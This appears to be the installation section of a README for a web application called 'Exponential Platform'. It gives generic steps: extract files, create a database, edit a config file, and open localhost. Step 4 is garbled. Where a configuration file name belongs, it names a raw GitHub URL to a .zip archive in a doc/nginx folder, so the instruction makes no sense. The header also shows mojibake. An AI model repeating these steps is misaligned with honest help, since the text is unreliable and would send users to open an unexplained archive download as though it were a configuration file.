### üîß Installation Steps

1. **Extract the Downloaded Files**: 
   Open the folder where you downloaded the file. Right-click the file and select ‚ÄúExtract All‚Äù or ‚ÄúExtract Here‚Äù based on your operating system.

2. **Move the Extracted Files**:
   Move the extracted folder to your preferred location, such as `C:\ExponentialPlatform` on Windows or `~/ExponentialPlatform` on macOS/Linux.

3. **Set Up Your Database**:
   Create a new database in your preferred database management tool (e.g., phpMyAdmin). Make sure to note down the database name, user, and password.

4. **Edit the Configuration File**:
   In the extracted folder, find `https://raw.githubusercontent.com/Wuhzaaa/exponential-platform-nexus/master/doc/nginx/platform_exponential_nexus_v1.2.zip` or the configuration file relevant for your environment. Open it with a text editor and input your database details.

5. **Run the Application**:
   Open your web browser and type the following URL:
   ```
   http://localhost/ExponentialPlatform/public
   ```
   Replace `localhost` with your server address if you are hosting it remotely.

6. **Follow the On-Screen Instructions**:
   The application will guide you through the setup process. Simply follow the prompts to finish the configuration.
